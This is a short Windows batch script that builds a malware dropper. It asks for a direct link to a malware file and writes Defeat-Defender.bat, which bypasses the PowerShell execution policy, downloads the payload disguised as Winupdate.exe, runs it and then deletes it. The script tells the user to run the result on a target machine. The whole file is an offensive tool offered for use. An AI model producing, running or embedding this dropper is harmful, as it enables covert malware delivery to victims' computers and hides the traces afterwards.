@echo off

setlocal enabledelayedexpansion

set /p a="Enter the Direct Link of malware : "

if [%a%]==[] ( 
CALL:error
pause
EXIT /B %ERRORLEVEL% 
) 

if [%a%] NEQ [] (
CALL:main
pause
EXIT /B %ERRORLEVEL% 
)

:main
echo.
echo Your  Url is :  %a% 
echo. >>Defeat-Defender.bat
echo mkdir %temp%\temp_folder >>Defeat-Defender.bat
echo powershell -command "Set-ExecutionPolicy Bypass" >>Defeat-Defender.bat
echo powershell -command "Invoke-WebRequest -Uri %a% -OutFile %temp%\temp_folder\Winupdate.exe" >>Defeat-Defender.bat
echo powershell -command "start %temp%\temp_folder\Winupdate.exe" >>Defeat-Defender.bat
echo timeout 4 >>Defeat-Defender.bat
echo powershell -command "del %temp%\temp_folder\Winupdate.exe" >>Defeat-Defender.bat
echo powershell -command "rmdir %temp%\temp_folder" >>Defeat-Defender.bat
echo.
echo File Generated Successfully.Run Defeat-Defender.bat on target machine .
EXIT /B %ERRORLEVEL% 
:error
echo.
echo Please Enter the link And Try Again!!!
